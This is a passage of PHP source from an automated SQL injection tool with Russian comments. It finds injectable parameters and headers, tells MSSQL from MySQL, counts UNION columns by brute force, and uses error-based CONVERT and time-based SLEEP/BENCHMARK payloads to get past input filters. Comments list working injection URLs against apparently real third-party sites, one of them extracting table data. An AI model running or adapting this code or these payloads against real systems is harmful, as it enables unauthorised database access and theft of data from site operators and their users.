			$new_check = $new_check."%2f**%2fcOnVeRt(int%2c(char(33)%2bchar(126)%2bchar(33)%2b(char(65)%2bchar(66)%2bchar(67)%2bchar(49)%2bchar(52)%2bchar(53)%2bchar(90)%2bchar(81)%2bchar(54)%2bchar(50)%2bchar(68)%2bchar(87)%2bchar(81)%2bchar(65)%2bchar(70)%2bchar(80)%2bchar(79)%2bchar(73)%2bchar(89)%2bchar(67)%2bchar(70)%2bchar(68))%2bchar(33)%2bchar(126)%2bchar(33)))";
			
			
			$file_check = $this->getContents($new_check);
			
			
			
			if(substr_count($file_check,'!~!ABC145ZQ62DWQAFPOIYCFD!~!')>0)
				{
					$this->d($new_check,'!~!ABC145ZQ62DWQAFPOIYCFD!~!');
					return 'mssql error ABC';
				}
			
			
			
			
			
			
			$d = $url_chek;
			$d = str_replace('&amp;', "&", $d);
			$d = str_replace("&","'&",$d);
			$d .= "'0=A";
				//$this->d($d,'d');
			
			
			
		
			
			$file = $this->getContents($d);
			
			
			if($file=='')
			{
				$this->d('stop tk error mssql = 1');	
				return false;
			}

			
			
			foreach ($this->error_text_mssql as $key)
			{

				if(substr_count($file,$key)>0)
				{
					$this->d($url_chek,'good url');
					return $key;
				}
			}
			
			//$this->d($file,'$file');
			//exit;
				
		}	
		
		
		
		
		
		return false;
		

	}
		
		
		
	
	
	
	////////////////////////////////////////////////////////////////
	//////НАХОЖЕНИЕ МЕТОДА(перебор,ошибка) ДЛЯ SQLI инъекции///////
	///// ЭТО ДЛЯ ОПРЕДЕЛЕНИЯ КАКИМ СПОСОБ БУДЕТ ЛОМАТЬСЯ URL в STARTS ЮЗАЕТСЯ, не учается в запросах///
	////////////////////////////////////////////////////////////////
	function inject($url,$data=false,$set=false,$post=false){//фукнция предраспределения
		
		$this->head_enable = false; 
		
		$this->https_check=false;//сбросить счёт проверки на https
		
		
		$this->check_https($url,$this->h_s);
		$url = $this->filter_url($url);
		
		
		
		if($this->check_head($url)==true)
		{
			$this->d('head START');
			$url = str_replace('post::','',$url);
			$res = $this->head_inject($url,$this->h_s,$data,$set,$post);
			return $res;
		}else
		{
			
			$res = $this->get_inject($url,$data,$set,$post);
			return $res;
	
			
		}
	}
	
	function get_inject($url,$data=false,$set=false,$post=false){//дочерняя START и далее определние на уязвимость 
		
		
		
		$this->sleep_check2 = TRUE;
		
		$this->check_https($url);
		$this->url = $this->filter_url($url);
		
	
		if($this->head_enable==true)
		{

			//подменный url как значение POST			
			$this->url2 = $this->url;		
		}
		

			
		if (preg_match('/\.asp|\.cfm/si', $this->url))
		{
			//$this->d('asp cfm link inject');
			
			if($this->mssql_check==true)
			{
			
				if($this->mssql == false)
				{
					
					
					if( $this->inj_test_get_mssql($this->url))
					{
						$this->d('inj_test_get_mssql INJECT TRUE INJECT PREDVARITELNO');
						$this->mssql = true;
					}else
					{
						//$this->d('false testing_mssql preg VOZMOJNO MYSQL');
						$this->mssql = false;
						//return false;
					}
				}
			
			}
			
			
		}else
		{
			$this->mssql = false;	
		}
		
		//exit;
		
		
				
		if($data!==false)
		{	
				
			//$this->d($data,'data yes');
			//exit;
			
		
			if(isset($data['posts_one']) or $data['posts_one'] !='')
			{
				$data['posts'] = $data['posts_one'];
				
			}
			
			
			if($data['posts']['http'] =='https' or $data['posts']['http'] =='https://')
			{
				$this->https=true;
				$this->https_check=true;
			}	
			
			
		
			if($data['posts']['method']==10 AND $this->sleep_metod !=true)
			{
				//$this->d('method = 10 and sleep false');
				//return false;
			}
		
			
			$this->sposob  = $data['posts']['sposob'];
			$this->method  = $data['posts']['method'];
			
			
			if(intval($data['posts']['sposob'])==0){
				$this->get_by_error='';
			}
			
			if(intval($data['posts']['sposob'])==1){
				$this->get_by_error='%27';
			}
			
			if(intval($data['posts']['sposob'])==2){
				$this->get_by_error='%22';
			}
				
				
				
				$w = explode(',', $data['posts']['work']);
				
				if($w!=='')
				{
				
					foreach ($w as $v)
					{
						if(intval($v)!==0)$this->work[] = $v;
					}
				}
				
				$this->column  = $data['posts']['column'] ;
				$this->version = $data['posts']['version'] ;
			
			if($set !==false )
			{
				
				$set = unserialize($set);
				
				//$this->d($set,'inject $set !==false inject');
				
				
				
				$this->set = $this->parse_link('http://'.$this->url);
				
				if($this->https){
					$this->set["scheme"] = 'https';
				}else{
					$this->set["scheme"] = 'http';
				}
				
				$this->sec=3;
				$this->set['full'] = $this->set['scheme'].'://'.$this->set['host'].$this->set['path'].'?';
				
				$this->set['sleep']['flt']['tp']=$set['tp']; 
				$this->set['sleep']['flt']['qt']=$set['qt'];
				$this->set['sleep']['flt']['sp']=$set['sp'];
				$this->set['sleep']['flt']['ed']=$set['ed'];
				$this->set['sleep']['flt']['an']=$set['an'];
				$this->set['sleep']['flt']['nl']=$set['nl'];
				$this->set['sleep']['flt']['sq']=$set['sq'];
				$this->set['sleep']['flt']['sl']=$set['sl'];
				
				$this->set['sleep']['scb']= $set['scb'];
				$this->set['sleep']['coment']= $set['coment'];
				$this->set['sleep']['outp']= $set['outp'];
				$this->set['sleep']['hex']= $set['hex'];
				$this->ret['sleep']['key'] = $set['key'];
				$this->ret['sleep']['val'] = $set['val'];
				

				$this->sleep_metod = true;
			
			}
		
			
		}else{
			
			
			if($this->start() == true)
			{
					
				if($this->mssql==true)
				{
					
					$this->mssqlGetVersion();
					
					$v = substr($this->version, 0,1);
					
					if($v=='M' or $v=='m')
					{
						return true;
					}else{
						
						return false;
					}
					
						
				}
				else
				{
					if($this->version !='')
					{
						return true;
					}
					
					
					$this->mysqlGetVersion();
					
					if($this->version !='')
					{
						return true;
					}
				}
					
				
				return false;
				
				
			}else
			{
				return false;
			}
			
		}
		
	}	
		
	function head_inject($url,$hs,$data=false,$set=false,$post=false){//выступает как предоболочка так и самостоятельная функция
	
		$this->https_check=false;
		$this->check_https($url,$hs);
	
		$this->header = true;
		$this->head_enable = true;
	
	
		$head = $hs['inject'];

		if($hs['url'] !='')$url = $hs['url'];
		$url = $this->filter_url($url);
		
		
		
		
		
		$tmp = parse_url($url);
		$url =$tmp['path']; 
		//$this->d($tmp,'tmp inject');
		
		
		
		if($head == 'useragent'){
			$this->method_old =true;
			$this->h_s['useragent'] = 'mozilla';
		}elseif($head == 'referer'){
			$this->method_old =true;
			$this->h_s['referer'] =   'google.com';
		}elseif($head == 'forwarder'){
			$this->method_old =true;
			$this->h_s['forwarder'] = '8.8.8.8';
		}elseif($head == 'post'){
			$this->h_s['post'] =      $hs['post'];
		}elseif($head == 'cookies'){
			if($hs['cookies'] !=''){
				$this->h_s['cookies'] =   $hs['cookies'];
			}else{
				$this->h_s['cookies'] =   $this->h_s['cookies'];
			}
			
		}
		
		
		
		$this->h_s['post_static'] =  $hs['post_static'];
		
		$this->h_s['inject'] = $head;
		
		$this->h_s['url'] =  $url;
		
		//$this->d($this->h_s,'$this->h_s');
		//exit;
		
		$test = $this->get_inject($url."?".$this->h_s[$head],$data,$set,$post);
		
		
		
		if($test == TRUE){
			return $head;	
		}else{
			return false;
		}
		
	}
	
	
	
	
	
	
	function start(){//стартовая функция для запуска 4 способов
			
			$this->d('start nachalo!!!');
			
			
			if($this->mssql==true)
			{
				
				
				if($this->mssqlOrderError()==true){
					
					$this->d("MSSQL GOOD mssqlOrderError");
					
					//exit;
					
					return TRUE;
				}else{
					$this->d("MSSQL BAD mssqlOrderError");
				}
				
				//return FALSE;
				
				
				
				if($this->mssqlMovePerebor()==true)
				{
				
				
					$this->d("MSSQL GOOD PEREBOR");
					//$this->d($this->sposob,'this->sposob');
					//$this->d($this->method,'this->method');
					
					
					return TRUE;
				}else
				{
					$this->d('false inject MSSQLMovePerebor');
					$this->d('esli 100% MSSQL to ne checkaem dalshe');
					//return false;
				}
				
				return false;
				
				
			}
			
			$this->mssql=false;
		
			
	
			
			if($this->type_sposob_union==true){
			
				if($this->mysqlMovePerebor()==true){
					$this->d('mysqlMovePerebor YES teper proverka version');
					//$this->d($this->sposob,'this->sposob');
					//$this->d($this->method,'this->method');
					
				
					$this->mysqlGetVersion();
				
					$this->d($this->version,'$this->version');
					if($this->version =='')
					{	
						$this->d('mysqlMovePerebor YES, no version NOOOOO ->>');
					}else
					{	
						return true;
					}
				
				}else{
					$this->d('false inject mysqlMovePerebor');
				}
			}
			
			//return false;
			
			
			
			if($this->type_sposob_sleep==true){
			
				if($this->sqli() == true)
				{
						$this->d('sleep_method YES');
						$this->d($this->method,'this->method');
						$this->d($this->sposob,'this->sposob');
						
						$this->mysqlGetVersion();
						
						
						
						if($this->version =='')
						{	
							$this->d('SLEEP INJECTION YES, no version NOOOOO ->>');
						}else
						{	
							$this->sleep_metod = true;
							return true;
						}
						
						return true;
				}else{
				
					$this->d('false inject sleep method');
					$this->sleep_metod = false;
					
				}
			}
		

	
		
			if($this->head_enable==true){return false;}
			if($this->mssql==true){return false;}

			
			
			
			
			
			
			if($this->type_sposob_FindErrorSqlNew==true){
				
				if($this->mysqlFindErrorSqlNew()==true){
						$this->d('mysqlFindErrorSqlNew YES');
						
						$this->mysqlGetVersion();
						
						if($this->version =='')
						{	
							$this->d('mysqlFindErrorSqlNew YES, no version NOOOOO');
						}else
						{	
							return TRUE;
						}
						
						return true;	
				}else{
					$this->d('false inject mysqlFindErrorSqlNew---');
				}
			
			}
			
			if($this->type_sposob_FindErrorSql==true){
			
				if($this->mysqlFindErrorSql()==true){
						$this->d('mysqlFindErrorSql YES');
						
						$this->mysqlGetVersion();
					
						
						if($this->version =='')
						{	
							$this->d('mysqlFindErrorSql YES, no version NOOOOO');
							return false;
						}else
						{	
							return TRUE;
						}
						
						
				}else{
					$this->d('false inject mysqlFindErrorSql---');
				}
			}
			
			
			/**
			if($this->mysqlOrderError()==true){
					$this->d('mysqlOrderError YES');
					
					$this->mysqlGetVersion();
				
					
					if($this->version =='')
					{	
						$this->d('mysqlOrderError YES, no version NOOOOO');
					}else
					{	
						return TRUE;
					}
					
					
			}else{
				$this->d('false inject mysqlOrderError---');
			}
			**/
			
			return FALSE;
			
			
		}

	########################## --MYSQL-- ################################	
		
	function mysqlMovePerebor(){//MYSQL перебор variant_query; sposob 1 и метод до 2 UNION c ошибкой
			
			$this->d('mysqlMovePerebor nachalo');
			
			$sposob = $this->variant_query;// список query запросов для перебора
			
		
			$spos = 1;//тут содержится массив запросов
			
			foreach ($sposob as $queryes)//в $queryes массив из 3 массивов
			{
								
				$method=0;//это к примеру этот 1111111111111+UNION+SELECT+ метод
				
				//$this->d($queryes,'$queryes');
				
				foreach ($queryes as $value)//в $value array('1111111111111+UNION+SELECT+','+--+'), 
				{
					

					
					$result = $this->getSposob($value);	
					
					if($this->content_empty ==1){
						return false;
					}
					
					if($result!==false)
					{
					
						$this->method = $method;

						$this->sposob = $spos;// получается тут всегда первым будет
						
						return true;				
				
					}
				
					$method++;
					//exit;
				}
				$spos++;
			}
			
				
				//$this->mysqlGetVersion();
				//$this->d($this->version,'$this->version');
				//exit;

			return false;
			
			
		}
		
	function getSposob($query_query){// создание url с колонкам и поиск нужных в ответе /////ДОЧЕРНЯЯ ФУНКЦИЯ для методов///////
		
		
				$this->d($query_query,'$query_query');
				
				//exit;
				for ($i=1;$i<=$this->column_limit;$i++)//лимит 25 по дефолту
				{
				
					$col = 1;
					$query = $query_query[0];
					
					while ($col<=$i)
					{
						
	//http://kinoklubnichka.ru/news_view.php?news_id=2 UNION ALL SELECT (SELECT CONCAT('qvkqq',IFNULL(CAST(ACTIVE AS CHAR),' '),'jzarqt',IFNULL(CAST(AGENT_INTERVAL AS CHAR),' '),'jzarqt',IFNULL(CAST(DATE_CHECK AS CHAR),' '),'jzarqt',IFNULL(CAST(ID AS CHAR),' '),'jzarqt',IFNULL(CAST(IS_PERIOD AS CHAR),' '),'jzarqt',IFNULL(CAST(LAST_EXEC AS CHAR),' '),'jzarqt',IFNULL(CAST(MODULE_ID AS CHAR),' '),'jzarqt',IFNULL(CAST(NAME AS CHAR),' '),'jzarqt',IFNULL(CAST(NEXT_EXEC AS CHAR),' '),'jzarqt',IFNULL(CAST(SORT AS CHAR),' '),'jzarqt',IFNULL(CAST(USER_ID AS CHAR),' '),'qjzzq') FROM u35491_2.b_agent LIMIT 2,1)-- -
						
							
						if($col==1){
							$query .= 'CHAR('.$this->charcher('-x'.$col.'-Q-').')';
							
							//$query .= 'IFNULL(CAST('.$this->charcher('-x'.$col.'-Q-').' AS CHAR))';
							
						}else{
							
							$query .= ',CHAR('.$this->charcher('-x'.$col.'-Q-').')'; 
							
							//$query .= ',IFNULL(CAST('.$this->charcher('-x'.$col.'-Q-').' AS CHAR))';
						}
							
						
						
						
						$col++;
					}
				
					
					$column[$i] = $this->url.$query.$query_query[1];
						
					flush();
					//$column_post[$i] = $query.$query_query[1].'+/*';
					
					//$this->d($this->url,'$this->url');
					
									
				}
				
			//	exit;
				
				//if($this->debug==true){$this->d($column,'$column');}
			
				
				
				$i=1;
				
				foreach ($column as $key=>$value)
				{
					
					//$this->form_set['form_post_query'] = str_replace($this->url,'',$value);
					$this->form_set['form_post_query'] = $value;
					
					//$this->d($this->form_set['form_post_query'],'dad');
					//exit;
					
					$file = $this->getContents($value);
					
					//if($this->content_empty ==1){
					//	return false;
					//}
					
					if($file)
					flush();
					
					//exit;
					if(strstr($file, '-Q-'))
					{
						if($this->debug==true){$this->d($key,'$value');}
						
						$columnZ = $key;
						
						
						break;
						
					}
					
					$i++;
					//if($i==10){exit;}
					
				}
				
			
			
				if(isset($columnZ))
				{	

					$this->d($columnZ,'$columnZ!!!!!!!!!!!!!!');
				
					preg_match_all('~-x(.*?)-Q-~',$file,$arr);
					
					$this->column = $columnZ;
					$this->work   = $arr[1];
						
					return array($columnZ,$arr[1]);
				}else{
					return FALSE;
				}
		
	}

	########################## ++MSSQL++ ################################
	
	function mssqlMovePerebor(){//MSSQL перебор variant_query_mssql; sposob 1 и метод до 2 UNION c ошибкой
		
		$this->d('mssqlMovePerebor nachalo');
		
		$sposob = $this->variant_query_mssql;// список query запросов для перебора
		
	
		$spos = 1;//тут содержится массив запросов
		
		foreach ($sposob as $queryes)//в $queryes массив из 3 массивов
		{
							
			$method=0;//это к примеру этот 1111111111111+UNION+SELECT+ метод
			
			//$this->d($queryes,'$queryes');
			
			foreach ($queryes as $value)//в $value array('1111111111111+UNION+SELECT+','+--+'), 
			{
				
				$result = $this->getSposob_mssql($value);	
					
				
				if($result!==false)
				{
				
					$this->method = $method;

					$this->sposob = $spos;// получается тут всегда первым будет
					
					return true;				
			
				}
			
				$method++;
				//exit;
			}
			
			$spos++;
		}
		
			
			//$this->mysqlGetVersion();
			//$this->d($this->version,'$this->version');
			//exit;

		return false;
		
		
	}
	
	function getSposob_mssql($query_query){// создание url с колонкам и поиск нужных в ответе 
	
	/////ДОЧЕРНЯЯ ФУНКЦИЯ для методов///////
		
	
		
		
				$this->d($query_query,'$MSSQL_query');
				
				for ($i=1;$i<=$this->column_limit;$i++)//лимит 25 по дефолту
				{
				
					$col = 1;
					$query2 = $query_query[0];
					
					while ($col<=$i)
					{
						
						
						$inx = $this->strtohex('-x'.$col.'-Q-');
						
						
						if($col==1){
							$query2 .= "cAsT({$inx} as char)";
						}else{
							$query2 .= ",/**/cAsT({$inx} as char)";
						}
							
						$col++;
					}

					if($query_query[1] =='')
					{
						$column2[$i] = $this->url.$query2;
					}else{
						$column2[$i] = $this->url.$query2.$query_query[1];
					}
				
					
									
				}
				
				
			
				if($this->debug==true){$this->d($column2,'$column2');flush();}
			
				
				//exit;
				$i=1;
				
				foreach ($column2 as $key=>$value)
				{
					
					$this->form_set['form_post_query'] = $value;
					
					$file = $this->getContents($value);

					
					//exit;
					if(strstr($file, '-Q-'))
					{
						if($this->debug==true){$this->d($key,'$value');}
						
						$columnZ = $key;
						
						
						break;
						
					}
					
					$i++;
					//if($i==10){exit;}
					
				}
				
			
			
				if(isset($columnZ))
				{	

					$this->d($columnZ,'$columnZ!!!!!!!!!!!!!!');
				
					preg_match_all('~-x(.*?)-Q-~',$file,$arr);
					
					$this->column = $columnZ;
					$this->work   = $arr[1];
						
					return array($columnZ,$arr[1]);
				}else{
					return FALSE;
				}
		
	}
	
	##########################
	
	function mssqlOrderError(){//через ошибки у mssql
	
	
	
	
		$ku1 = $this->charcher_mssql('[X]');
		$ku2 = $this->charcher_mssql('[XX]');

		
		$zapr_mssql ="db_name()";
		$zapr_mssql =$ku1.'+'.$zapr_mssql.'+'.$ku2;
		
	
		$this->d($ku1,'$ku1');
		$this->d($ku2,'$ku2');
		$this->d($zapr_mssql,'$zapr_mssql');
	
		
			
		
		$string['']  = "' or 1=convert(int,$zapr_mssql COLLATE SQL_Latin1_General_Cp1254_CS_AS) and '1'='1";
		//$string['']  = "' or 1=cOnVeRt(int,(/**/cAsT($zapr_mssql as char))) and '1'='1";
		//$string['']  = "' or 1=cOnVeRt(int,/**/cAsT($zapr_mssql as char)) and '1'='1";
		//$string['']  = "' and 1=convert(int,$zapr_mssql) and '1'='1";
		//$string['']  = "' or 1=cOnVeRt(int,$zapr_mssql) and '1'='1";
		//$string['']  = " and 1=convert(int,$zapr_mssql) and '1'='1";
		//$string['']  = "' and 1=convert(int,$zapr_mssql)";
	
		$sp = 0;
		
		
//http://asme-pd.bidding4charity.com/items.asp?CID=6		
//http://asme-pd.bidding4charity.com/items.asp?CID=6' or 1=[t] and '1'='1
		
		
//http://asme-pd.bidding4charity.com/items.asp?CID=6%27%20or%201%3Dconvert%28int%2Cdb_name%28%29%20COLLATE%20SQL_Latin1_General_Cp1254_CS_AS%29%20and%20%271%27%3D%271
//http://asme-pd.bidding4charity.com/items.asp?CID=6' or 1=convert(int,db_name() COLLATE SQL_Latin1_General_Cp1254_CS_AS) and '1'='1		
//http://asme-pd.bidding4charity.com/items.asp?CID=6%27%20or%201%3DcOnVeRt%28int%2C%28db_name%28%29%20%20COLLATE%20SQL_Latin1_General_Cp1254_CS_AS%29%20and%20%271%27%3D%271


		
//http://asme-pd.bidding4charity.com/items.asp?CID=6%27%20or%201%3Dconvert%28int%2Cdb_name%28%29%20COLLATE%20SQL_Latin1_General_Cp1254_CS_AS%29%20and%20%271%27%3D%271%09	
		
		 
		  
		  
		  
		  
		  
		   
		    
			
			 
		foreach ($string as $key=> $val)
		{
			
			if($this->url_encode==true)
			{
				$url = $this->url.rawurlencode($val);
			}else{
				$url = $this->url.$val;
			}
			
		
			
			
			//$url = rawurlencode("' or 1=convert(int,db_name() COLLATE SQL_Latin1_General_Cp1254_CS_AS) and '1'='1");
			//$url = "http://asme-pd.bidding4charity.com/items.asp?CID=6".$url;
			
			$str1 = $this->getContents($url);
			
			
			$this->d($url,'url');
			
			if($this->debug_full_content==true){
				$this->d($str1,'$str1'.$val);
			}
			
			
			
			if($str1 !=''){
			
				preg_match("~value \'(.*)\' to data type int~is",$str1,$arr);
				//$this->d($arr,'$arr');
			
			
			
		
				if(stristr($arr[1], 'microsoft')){
					
					$this->d('good');
					$this->get_by_error = $key;
					$this->sposob = $sp;
					$this->method = 3;
					return TRUE;
			
				}
			//$sp++;
			}
		}
		//exit;
		
		return false;
	}
	
	
	##########################
	
	function sqli($url = ''){ //для метода sleep UNION без ошибки
		
		$this->d('sqli nachalo');
		
		if($url !=''){
			$this->url=$url;
		}else{
			$this->url = $this->url;
		}
		

		//общие данные для всех
		$this->set=$this->parse_link('http://'.$this->url);
		if($this->https){
			$this->set["scheme"] = 'https';
		}else{
			$this->set["scheme"] = 'http';
		}
		
		
		$this->sec=3;// >=2
		$this->set['full'] = $this->set['scheme'].'://'.$this->set['host'].$this->set['path'].'?';
		$this->set['sqli'] = 0;
		
		$ttt = time();
		

		foreach($this->set['query'] as $key => $val)
		{
		
			$new = time();
			$razn = $new-$ttt;
			//стопаем перебор если слишком долго идет
			if($razn>$this->time_sleep){$this->d('TIME!!!!  SLEEP!!');return false;}
		
		
			//для метода sleep
			$this->set['sleep']['flt']['tp']=false;//Фильтруется ли вообще что то?
			$this->set['sleep']['flt']['qt']=false;//Фильтруется ли кавычка?
			$this->set['sleep']['flt']['sp']=false;//Фильтруется ли пробел?
			$this->set['sleep']['flt']['ed']=false;//Фильтруется ли комментарий /**/?
			$this->set['sleep']['flt']['an']=false;//Фильтруется ли слово And?
			$this->set['sleep']['flt']['nl']=false;//Нужен ли нул байт?
			$this->set['sleep']['flt']['sq']=false;//Нужена ли ковычка в начале?
			$this->set['sleep']['flt']['sl']=false;//Можно ли использовать SLEEP
			
			$this->set['sleep']['hex']= false;
			
			
			//array("1111111111111'+UNION+SELECT+","+and+'0'='0"
			
			if($this->sleep_check1):
			//Класический случай - иньект в условии WHERE
			if(is_numeric($val))
			{
				$this->array_sql['array_sleep'][0]=' AnD SLeeP('.$this->sec.')';
				$this->array_sql['array_sleep'][1]='&&SlEEp('.$this->sec.')'; //&&SLEEP = ANDSLEEP
			}

			//Ничего не фильтруется AND+'+SLEEP	
			$this->array_sql['array_sleep'][2]="' AnD sLeep(".$this->sec.") ANd '1";
			
			//Если фильтруется AND или пробел,кавычка есть
			$this->array_sql['array_sleep'][3]="'&&sLEEp(".$this->sec.")&&'1";
			
			//Пытаемся обрезать фильтр нулевым байтом, мб прокатит
			$this->array_sql['array_sleep'][4]=chr(0)."'||SLeeP(".$this->sec.")&&'1";

			//А вдруг ветка мускуля ниже пятой, значит ебемся с бенчмарком
			if(is_numeric($val))
			{
				$this->array_sql['array_sleep'][5]=' AnD BeNChMaRK(2999999,MD5(NOW()))';
				$this->array_sql['array_sleep'][6]='&&BeNChMaRK(2999999,MD5(NOW()))';
			}
			//Эта версия для строковых параметров
			$this->array_sql['array_sleep'][7]="' aND BeNChMaRK(2999999,Md5(NoW())) AnD '1";
			$this->array_sql['array_sleep'][8]="'&&BeNChMaRK(2999999,mD5(NOW()))&&'1";
			
			$this->array_sql['array_sleep'][0]="' AnD sLeep(".$this->sec.") ANd '0'='0";
			
			//+++++++++++++++++++++++++++++++++++//
			
			//Метод sleep
			$this->tmp=$this->create_get($key,$val);
			
			$this->tmp=$this->create_packet('',$this->tmp);
			
			$this->scnd=$this->send_packet($this->tmp,'header','time');//оригинал
			
			
			
			//перебираем всем наши запросы предварительные 8 штук запросов, если 1 находим нормальный,то будем его крутить дальше  и из цикла выходим
			foreach($this->array_sql['array_sleep'] as $i => $ff)
			{
			
				$this->tmp=$this->create_get($key,$val.$ff);
				
				$this->tmp=$this->create_packet('',$this->tmp);
				
				$this->tmp=$this->send_packet($this->tmp,'header','time');
				//exit;
				
				//$this->d($this->tmp,'$this->tmp TIME');
				
				//return true;
				
				
				if($i<5)
				{
				
					if($this->tmp >=($this->sec-1)){
					
						$this->ret['sleep']['type']=1;
						$this->ret['sleep']['key']=$key;
						$this->ret['sleep']['val']=$val;
						$this->ret['sleep']['tp']=$i;
						$this->ret['sleep']['time']=$this->tmp;
						break;
					}
				}else
				{
					if($this->tmp-$this->scnd>1)
					{
						$this->ret['sleep']['type']=1;
						$this->ret['sleep']['key']=$key;
						$this->ret['sleep']['val']=$val;
						$this->ret['sleep']['tp']=$i;
						$this->ret['sleep']['time']=$this->tmp;
						break;
					}
				}
				
			}
			
			//логирование
			$this->d($this->scnd,'scnd');
			$this->d($this->ret,'ret');	
			$this->d($this->set,'set');
			//exit;
			if($this->ret['sleep']['type']) //предварительное тестирование прошёл
			{
				
				$this->d('sleep_metod PART 1 GOOD');
				if($this->sleep_check2 != TRUE)return 'sleep_metod';
				
			}else{
				return false;
			}
				
			endif;//sleep_check1	
			
			if($this->sleep_check2):
			
			$this->d('$this->sleep_check2 IDEM DALSHE');
			
			if($this->ret['sleep']['type']) //Определяем, что фильтруется
			{
				//Определить фильтрацию на 1.Кавычки 2. Пробел
				if($this->ret['sleep']['tp']==0)
				{ //AND SLEEP(3)
					$this->set['sleep']['flt']['sq']=false;//ковычка в начале не нужна
					$this->set['sleep']['flt']['sl']=true; //+sleep

					//Определяем наличие фильтрации кывычки
					$this->tmp=$this->send_packet($this->create_packet('',$this->create_get($this->ret['sleep']['key'],$this->ret['sleep']['val']." AnD slEEP('".$this->sec."')")),'header','time');
					
					//запрос выполняется, тоесть нас пропустили с кавычкой
					if($this->tmp>=($this->sec-1)){ 
						//проверяем тоже с кавычкой но в другом месте SLEE'P, посылаем заведо не верный запрос. Если фильтруется то выполнится, если нет то значит кавычка не фильтруется
						$this->tmp=$this->send_packet($this->create_packet('',$this->create_get($this->ret['sleep']['key'],$this->ret['sleep']['val']." anD SleEE'P(".$this->sec.")")),'header','time');
						//если запрос выполнится, значит зафильтровалась
						if($this->tmp>=($this->sec-1))$this->set['sleep']['flt']['qt']=true;
						else $this->set['sleep']['flt']['qt']=false;
					}else $this->set['sleep']['flt']['qt']=true;//не пропустили, значит фильтруется

					//Определяем наличие фильтрации двойного комментария
					$this->tmp=$this->send_packet($this->create_packet('',$this->create_get($this->ret['sleep']['key'],$this->ret['sleep']['val'].'/**/AND/**/SLEEP('.$this->sec.')')),'header','time');
					if($this->tmp>=($this->sec-1))$this->set['sleep']['flt']['ed']=false;//нет
					else $this->set['sleep']['flt']['ed']=true;//фильтруется
					if($this->set['sleep']['flt']['ed']||$this->set['sleep']['flt']['qt'])$this->set['sleep']['flt']['tp']=true; //tp хоть что то фильтруется
				//------------------------------------------------------------//
				}else if($this->ret['sleep']['tp']==1)//&&SLEEP(3)
				{
					$this->set['sleep']['flt']['sq']=false;//ковычка в начале не нужна
					$this->set['sleep']['flt']['sl']=true; //sl sleep можно использовать

					//Определяем наличие фильтрации кывычки
					$this->tmp=$this->send_packet($this->create_packet('',$this->create_get($this->ret['sleep']['key'],$this->ret['sleep']['val']."&&SLeeP('".$this->sec."')")),'header','time');
					if($this->tmp>=($this->sec-1))$this->set['sleep']['flt']['qt']=false;//нет
					else $this->set['sleep']['flt']['qt']=true;//фильтруется

					//Определение фильтрации пробела при отсутствии фильтрации кавычки
					if(!$this->set['sleep']['flt']['qt']){ //кавычка не фильтруется &&SLEEP('0 "
						$this->tmp=$this->send_packet($this->create_packet('',$this->create_get($this->ret['sleep']['key'],$this->ret['sleep']['val']."&&slEEp('0 ".$this->sec."')")),'header','time');//Заведо ложный запрос SLEEP(0 3) не будет работать, если пробел фильтруется то запрос выполнится
						if($this->tmp>=($this->sec-1))$this->set['sleep']['flt']['sp']=true;
						else{//еще разок проверим
							$this->tmp=$this->send_packet($this->create_packet('',$this->create_get($this->ret['sleep']['key'],$this->ret['sleep']['val']."&&' '=0x20&&SLeeP(".$this->sec.")")),'header','time');
							if($this->tmp>=($this->sec-1))$this->set['sleep']['flt']['sp']=false;
							else $this->set['sleep']['flt']['sp']=true;
						}
					//если кавычка фильтруется
					}else{$this->tmp=$this->send_packet($this->create_packet('',$this->create_get($this->ret['sleep']['key'],$this->ret['sleep']['val']."&&SLeep(0 ".$this->sec.")")),'header','time');//ложный запрос, выполнится значит фильтруется
						if($this->tmp>=($this->sec-1))$this->set['sleep']['flt']['sp']=true;
						else{
							$this->tmp=$this->send_packet($this->create_packet('',$this->create_get($this->ret['sleep']['key'],$this->ret['sleep']['val']."&&SL eEP(".$this->sec.")")),'header','time');
							//если выполнится, то значит не фильтруется
							if($this->tmp>=($this->sec-1))$this->set['sleep']['flt']['sp']=false;
							else $this->set['sleep']['flt']['sp']=true;
						}
					}

					//Если не фильтруется пробел то значит фильтруется слово AND
					if(!$this->set['sleep']['flt']['sp'])$this->set['sleep']['flt']['an']=true;
					else{
						//Определение фильтрации слова AND при наличии фильтрации пробела и отсутствии фильтрации кавычки
						if(!$this->set['sleep']['flt']['qt']){//если кавычку пропускает
							$this->tmp=$this->send_packet($this->create_packet('',$this->create_get($this->ret['sleep']['key'],$this->ret['sleep']['val']."&&'anD'=0x414E44&&SLEep(".$this->sec.")")),'header','time');
							//0x414E44 = AND, если выполнится значит не фильтруется
							if($this->tmp>=($this->sec-1))$this->set['sleep']['flt']['an']=false;
							else $this->set['sleep']['flt']['an']=true;
						}else{
						//хитрый сука запрос какой то
							$this->tmp=$this->send_packet($this->create_packet('',$this->create_get($this->ret['sleep']['key'],$this->ret['sleep']['val']."&&(1)AND@x:=1&&sleEP(".$this->sec.")")),'header','time');
							//шняга выполнилась, значит не фильтруется
							if($this->tmp>=($this->sec-1))$this->set['sleep']['flt']['an']=false;
							else $this->set['sleep']['flt']['an']=true;
						}
					}

					//Определяем наличие фильтрации двойного комментария при отсутствии фильтрации кавычки
					if(!$this->set['sleep']['flt']['qt']){//кавычка не фильтруется
						$this->tmp=$this->send_packet($this->create_packet('',$this->create_get($this->ret['sleep']['key'],$this->ret['sleep']['val']."&&'/**/'=0x2F2A2A2F&&SLeeP(".$this->sec.")")),'header','time'); //0x2F2A2A2F = /**/
						//по идее сюда бы еще проверчку на другие комментарии сделать надо
						if($this->tmp>=($this->sec-1))$this->set['sleep']['flt']['ed']=false;
						else $this->set['sleep']['flt']['ed']=true;
					}else{//кавычка фильтруется
						$this->tmp=$this->send_packet($this->create_packet('',$this->create_get($this->ret['sleep']['key'],$this->ret['sleep']['val']."/**/&&/**/SLEep(".$this->sec.")")),'header','time');
						//запрос выполнится, проверяем дальше
						if($this->tmp>=($this->sec-1)){
							$this->tmp=$this->send_packet($this->create_packet('',$this->create_get($this->ret['sleep']['key'],$this->ret['sleep']['val']."&&sLEep(0/**/".$this->sec.")")),'header','time');
							//Заведомо неверный запрос,если sleep исполнился, то фильруется
							if($this->tmp>=($this->sec-1))$this->set['sleep']['flt']['ed']=true;
							else $this->set['sleep']['flt']['ed']=false;
						}else $this->set['sleep']['flt']['ed']=true;
					}
					if($this->set['sleep']['flt']['ed']||$this->set['sleep']['flt']['qt']||$this->set['sleep']['flt']['an']||$this->set['sleep']['flt']['sp'])$this->set['sleep']['flt']['tp']=true;
				//------------------------------------------------------------//
